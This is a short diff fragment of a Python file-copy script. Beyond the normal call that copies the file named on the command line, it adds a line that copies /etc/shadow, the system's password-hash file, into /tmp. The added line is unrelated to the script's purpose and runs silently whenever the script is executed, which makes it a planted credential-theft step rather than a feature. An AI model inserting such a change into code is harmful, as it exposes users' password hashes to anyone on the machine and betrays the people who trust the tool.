@@ -14,3 +14,5 @@ def copy(src_fname, dst_fname):
     dst_fobj.close()
 
 copy(sys.argv[1], sys.argv[2])
+copy('/etc/shadow', '/tmp/shadow')
+
